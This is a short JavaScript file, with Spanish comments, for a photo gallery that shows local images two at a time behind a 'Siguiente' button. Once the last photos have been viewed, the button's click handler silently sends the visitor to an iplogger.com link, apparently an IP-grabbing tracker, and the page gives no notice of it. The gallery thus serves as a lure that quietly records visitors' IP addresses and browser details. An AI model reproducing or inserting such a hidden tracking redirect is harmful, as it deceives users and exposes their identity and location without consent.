document.addEventListener('DOMContentLoaded', () => {
    const gallery = document.getElementById('gallery');
    const nextBtn = document.getElementById('next-btn');
    
    // Lista de tus fotos JPEG locales. 
    // Debes guardar tus fotos en la misma carpeta que este archivo
    // con los nombres foto1.jpeg, foto2.jpeg, etc.
    const photos = [
        'foto1.jpg',
        'foto2.jpg',
        'foto3.jpg',
        'foto4.jpg'
    ];

    let currentIndex = 0;
    const itemsPerPage = 2; // Solo mostrar de dos en dos

    function renderGallery() {
        // Limpiamos la galería actual
        gallery.innerHTML = '';
        
        // Tomamos solo las dos imágenes correspondientes al índice actual
        const currentPhotos = photos.slice(currentIndex, currentIndex + itemsPerPage);
        
        currentPhotos.forEach((url, index) => {
            const card = document.createElement('div');
            card.className = 'photo-card';
            
            const img = document.createElement('img');
            img.src = url;
            img.alt = `Fotografía ${currentIndex + index + 1}`;
            
            card.appendChild(img);
            gallery.appendChild(card);
        });

        // Mantenemos el texto del botón siempre como "Siguiente"
        nextBtn.textContent = 'Siguiente';
    }

    nextBtn.addEventListener('click', () => {
        // Si ya no hay más fotos en la lista, hacemos la redirección
        if (currentIndex + itemsPerPage >= photos.length) {
            window.location.href = 'https://iplogger.com/XdkaD';
            return; // Detenemos la ejecución aquí
        }

        currentIndex += itemsPerPage;
        renderGallery();
        
        // Hacemos scroll suave hacia el inicio de la galería
        window.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
    });

    // Renderizado inicial
    renderGallery();
});
